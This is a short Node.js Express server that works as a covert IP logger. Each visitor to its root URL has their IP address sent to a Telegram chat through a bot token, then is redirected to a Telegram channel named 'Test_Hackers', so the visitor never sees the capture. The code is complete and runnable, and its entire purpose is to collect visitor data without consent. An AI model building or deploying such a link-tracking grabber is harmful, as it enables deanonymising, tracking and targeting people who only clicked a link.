const express = require("express");
const fetch = require("node-fetch");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const TELEGRAM_CHANNEL = "https://t.me/Test_Hackers";

app.set("trust proxy", true);

app.get("/", async (req, res) => {
  const ip = req.ip;

  const msg = `🚨 New Visitor IP Logged: ${ip}`;
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;

  try {
    await fetch(url);
  } catch (error) {
    console.error("Failed to send message to Telegram:", error);
  }

  // Redirect to actual Telegram channel
  res.redirect(TELEGRAM_CHANNEL);
});

app.listen(PORT, () => console.log(`🚀 IP Logger running on port ${PORT}`));
